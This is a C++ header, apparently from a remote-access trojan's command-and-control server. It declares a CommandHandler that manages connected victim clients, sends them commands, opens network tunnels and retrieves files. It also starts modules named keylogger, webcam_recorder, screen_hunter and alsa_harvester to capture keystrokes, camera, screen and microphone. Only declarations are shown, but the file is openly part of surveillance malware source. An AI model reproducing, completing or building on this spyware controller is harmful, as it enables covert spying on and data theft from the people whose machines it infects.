#ifndef COMMAND_HANDLER_HPP
#define COMMAND_HANDLER_HPP

#include <iostream>
#include <string>
#include <vector>
#include <atomic>
#include <initializer_list>
#include <unordered_map>
#include <sstream>
#include <iterator>
#include <algorithm>
#include <exception>
#include <any>
#include <unistd.h>
#include <sys/select.h>
#include <sys/time.h>
#include <future>
#include <memory>
#include <fcntl.h>
#include <filesystem>
#include <chrono>
#include <thread>
#include "keylogger.hpp"
#include "alsa_harvester.hpp"
#include "webcam_recorder.hpp"
#include "screen_hunter.hpp"
#include "packet_tunnel.hpp"
#include "common.hpp"
#include "event_logger.hpp"
#include "server_macros.hpp"
#include "client_handler.hpp"
#include "data_handler.hpp"

#define INDEX_ARG 1
#define ALL_ARG 2
#define HELP_ARG 3
#define KILL_ARG 4
#define VERBOSITY_ARG 5
#define REMOVE_ARG 6
#define DEV_ARG 7
#define OUT_ARG 8
#define FILE_NAME_ARG 9
#define DEVICE_ARG 10
#define KB_LAYOUT_ARG 11
#define CONVERT_ARG 12
#define FPS_ARG 13
#define HW_IN_ARG 14
#define HW_OUT_ARG 15

#define ARG_TYPE_INT 0x1A
#define ARG_TYPE_STRING 0x1B
#define ARG_TYPE_SET 0x1C
#define ARG_TYPE_FLOAT 0x1D

#define MAX_COMMAND_LEN 256 + (PATH_MAX * 2)

class CommandHandler;

class C2FIFO {
public:
    C2FIFO();
    ~C2FIFO();
    int init();
    int fd_in;
    int fd_out;
};    

struct Argument {
    int arg_num_;
    int arg_value_type_;
    std::string arg_abbr_;
    std::string arg_full_;
    Argument(
        int __arg_num,
        int __arg_value_type,
        const std::string& __arg_abbr,
        const std::string& __arg_full
    );
};

struct Command {
    std::string shortcut_;
    std::string description_;
    std::vector<int> optional_;
    std::vector<int> required_;
    void (CommandHandler::*p_command_func_)();
    CommandHandler* p_command_handler_;
    Command(
        const std::string& __shortcut,
        const std::string& __description,
        void (CommandHandler::*__p_command_func)(),
        CommandHandler* __p_command_handler,
        std::initializer_list<int> __optional,
        std::initializer_list<int> __required = {}
    );
};

class CommandHandler {
public:
    CommandHandler(
        std::vector<ClientHandler*>* __p_clients, 
        EventLog* __p_event_log,
        std::atomic<bool>* __p_shutdown_flag,
        std::string* __p_ip,
        uint __port,
        int* __p_user_verbosity,
        std::vector<Tunnel*>* __p_tunnels,
        std::shared_ptr<TunnelContext> __tunnel_context
    );
    ~CommandHandler();
    void execute_command(char* __cmd, int __len);
private:
    int parse_command(const std::string& __root_cmd);
    bool command_exists(const std::string& __root_cmd);
    int parse_arguments(const std::string& __root_cmd, const std::string& __args_str);
    int local_execute(const char* __argv[]);
    
    void test();
    void help();
    void list();
    void set_verbosity();
    void show_verbosity();
    void kill();
    void get_dev();
    void get_file();
    void keylogger();
    void webcam_recorder();
    void screen_hunter();
    void alsa_harvester();

    uint find_open_port();
    void send_packet(uint16_t __packet, int __client_index);    
    void send_client(CommandCode __command, uint8_t __port, int __client_index);
    void send_client(CommandCode __command);
    void cleanup();
    void handle_tunnelt(Tunnel* __p_tunnel, int __connection_type);
    Tunnel* get_tunnel(int __client_index, CommandCode __command_code);
private:
    std::vector<ClientHandler*>* p_clients_;
    EventLog* p_event_log_;
    int* p_user_verbosity_;
    std::atomic<bool>* p_shutdown_flag_;
    std::string* p_ip_;
    uint port_;
    std::unordered_map<std::string,Command> command_map_;
    std::vector<Argument> argument_list_;
    int selected_client_;
    std::string cmd_;
    std::unordered_map<int, std::any> arg_map_;
    std::vector<Tunnel*>* p_tunnels_;
    std::shared_ptr<TunnelContext> tunnel_context_;
};

#endif // COMMAND_HANDLER_HPP